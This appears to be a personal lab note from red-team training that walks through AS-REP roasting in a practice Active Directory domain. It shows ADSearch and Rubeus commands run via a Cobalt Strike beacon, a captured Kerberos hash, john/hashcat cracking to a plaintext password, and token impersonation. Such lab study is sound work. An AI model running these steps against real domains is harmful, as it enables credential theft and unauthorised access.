*If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.  This configuration is enabled on the User Object and is often seen on accounts that are associated with Linux systems.*

![[Pasted image 20231205162616.png]]
As with kerberoasting, we don't want to asreproast every account in the domain.


on `WKSTN-2` as `DEV\bfarmer` run `ADSearch.exe` command below to identify users that are `susceptible` to `ASREP Roasting`
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname`
```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
	[+] cn                : Squid Proxy
	[+] distinguishedname : CN=Squid Proxy,CN=Users,DC=dev,DC=cyberbotic,DC=io
	[+] samaccountname    : squid_svc
```
`ASREP Roasting` credentials of user `squid_svc` with `Rubeus.exe`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap`
```powershell
[12/05 21:29:12] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
[12/05 21:29:16] [*] Tasked beacon to run .NET program: Rubeus.exe asreproast /user:squid_svc /nowrap
[12/05 21:29:17] [+] host called home, sent: 550780 bytes
[12/05 21:29:17] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: AS-REP roasting

[*] Target User            : squid_svc
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=squid_svc))'
[*] SamAccountName         : squid_svc
[*] DistinguishedName      : CN=Squid Proxy,CN=Users,DC=dev,DC=cyberbotic,DC=io

[12/05 21:29:17] [+] received output:
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\squid_svc'

[12/05 21:29:18] [+] received output:
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$squid_svc@dev.cyberbotic.io:BA98FACAB1CA017AEC99D6A9CA28DEEB$3D29893B4A2F82419A508ACB81D778854C004A1161767C6D9BFB3CC7E84AADB7D4A01A6B0618B2F5DE359D038E12473DF5E59B4AA132B684AB00567C3EDC27A91E4B0DA2EC4EB822E5FF1D62E8B9A6EE202BD97552A625633C63A47555508DE951F79585BB7CF2CB1812519A84BC9FD82D342431731CC8520819D2BCF9C361A5866EBA153993E56AB5DA9789B1D117EC2B4801B842D02F252101ED24B4DAC6115A49A4A176E9BE48A28B0D1BD430BC06E93FCDE88341A89D38EE5F60580EEB4BB51B55949405674C4F8D2FB4452230DBAE6B6E4C9FC53AD99DCD936EE41EC5D8DCE6072003BAD829ED969FD790F9A02CD9B5B3B2FF89
```
in order to break the hashes Use `--format=krb5asrep --wordlist=wordlist squid_svc` for john or `-a 0 -m 18200 squid_svc wordlist` for hashcat.
```powershell
$ john --format=krb5asrep --wordlist=wordlist squid_svc
Passw0rd!        ($krb5asrep$squid_svc@dev.cyberbotic.io)
```

# Impersonating `squid_svc` user

can [[Penetration Testing v2/crto_Defender/2. WKSTN2 - 1/4. user_Impersonation/7. Make Token|7. Make Token]] with the cracked credentials on `WKSTN-2` as `DEV\bfarmer`

```powershell
[12/05 21:34:15] beacon> make_token DEV\squid_svc Passw0rd!
[12/05 21:34:15] [*] Tasked beacon to create a token for DEV\squid_svc
[12/05 21:34:15] [+] host called home, sent: 101 bytes
[12/05 21:34:15] [+] Impersonated DEV\squid_svc (netonly)
```
![[Pasted image 20231205163525.png]]